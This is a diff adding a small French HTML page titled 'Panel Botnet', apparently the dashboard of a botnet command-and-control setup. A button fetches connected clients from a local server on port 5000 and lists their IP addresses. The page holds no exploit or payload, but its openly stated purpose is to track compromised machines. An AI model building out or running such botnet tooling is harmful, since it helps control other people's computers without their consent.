@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Botnet</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #0f0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .container {
+            margin: 20px auto;
+            padding: 20px;
+            max-width: 600px;
+            border: 1px solid #0f0;
+            background-color: #1e1e1e;
+        }
+        button {
+            background-color: #0f0;
+            color: #121212;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Panel de Contrôle</h1>
+        <button onclick="fetchClients()">Actualiser</button>
+        <ul id="client-list"></ul>
+    </div>
+
+    <script>
+        async function fetchClients() {
+            const response = await fetch("http://localhost:5000/connected_clients");
+            const clients = await response.json();
+            const clientList = document.getElementById("client-list");
+            clientList.innerHTML = "";
+            clients.forEach(client => {
+                const li = document.createElement("li");
+                li.textContent = `Client IP: ${client.ip}`;
+                clientList.appendChild(li);
+            });
+        }
+    </script>
+</body>
+</html>
